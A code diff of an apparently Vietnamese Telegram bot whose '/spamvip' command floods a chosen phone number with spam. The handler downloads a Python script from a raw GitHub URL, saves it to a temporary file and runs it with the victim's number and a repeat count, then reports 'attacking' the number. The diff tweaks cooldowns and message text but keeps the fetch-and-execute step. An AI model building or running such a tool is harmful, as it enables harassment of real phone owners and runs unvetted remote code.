@@ -327,7 +327,6 @@ def spam(message):
         bot.reply_to(message, f"Lỗi khi lấy script từ {script_url}: {str(e)}")
 
 blacklist = ["0789041631", "112", "113", "114", "115", "116", "117", "118", "119", "0", "1", "2", "3", "4", "5"]
-import requests
 import tempfile
 
 @bot.message_handler(commands=['spamvip'])
@@ -337,65 +336,55 @@ def supersms(message):
         bot.reply_to(message, 'Hãy Mua Vip Để Sử Dụng.')
         return
 
-    if len(message.text.split()) == 1:
-        bot.send_message(chat_id=message.chat.id, text="Vui lòng nhập số điện thoại cần spam.")
+    current_time = time.time()
+    if user_id in last_usage and current_time - last_usage[user_id] < 200:
+        bot.reply_to(message, f"Vui lòng đợi {200 - (current_time - last_usage[user_id]):.1f} giây trước khi sử dụng lệnh lại.")
         return
-     
-    params = message.text.split()
-    username = message.from_user.username
     
-    diggory_chat = f'''
-┌───⭓ {name_bot}
-│» Reply User: @{username}
-│» Vui lòng nhập đầy đủ thông tin
-│» Lệnh ví dụ là /spam 0123456789 30  (số lần spam)
-└───────
-    '''
-    
-    if len(params) < 3:
-        bot.reply_to(message, diggory_chat)
+    last_usage[user_id] = current_time
+
+    params = message.text.split()[1:]
+
+    if len(params) < 2:
+        bot.reply_to(message, "/spam 113 5 như này cơ mà.")
         return
 
-    sdt = params[1]
-    count = params[2]
+    sdt = params[0]
+    count = params[1]
 
     if not count.isdigit():
-        bot.reply_to(message, "/spam sdt 30 như này mới đúng.")
+        bot.reply_to(message, "Số lần spam không hợp lệ. Vui lòng nhập một số nguyên dương.")
         return
     
     count = int(count)
     
     if count > 30:
-        bot.reply_to(message, "Số lần spam không được vượt quá 30 lần.")
+        bot.reply_to(message, "/spam sdt 5 thôi nhé.")
         return
 
     if sdt in blacklist:
         bot.reply_to(message, f"Số điện thoại {sdt} đã bị cấm spam.")
         return
 
-    chat_id = message.chat.id
-    
     diggory_chat3 = f'''
 ┌──────⭓ {name_bot}
-│ User: @{username}
 │ Spam: Thành Công 
-│ Số Lần Spam VIP: {count}
+│ Số Lần Spam Free: {count}
 │ Đang Tấn Công : {sdt}
+│ Spam 30 Lần Tầm 5-10p mới xong 
+│ Hạn Chế Spam Nhé !  
 └─────────────
     '''
-    
-    # Fetch khai.py from the web URL
+
     script_url = "https://raw.githubusercontent.com/luvanlong01122007/luvanlong01122007/main/khai.py"
     try:
         response = requests.get(script_url)
         if response.status_code == 200:
-            # Save the script content to a temporary file
             with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                 temp_file.write(response.content)
                 temp_file_path = temp_file.name
-            # Execute the fetched script
             process = subprocess.Popen(["python", temp_file_path, sdt, str(count)])
-            bot.send_message(chat_id, diggory_chat3)
+            bot.send_message(message.chat.id, diggory_chat3)
         else:
             bot.reply_to(message, f"Không thể lấy script từ {script_url}. Mã lỗi: {response.status_code}")
     except Exception as e:
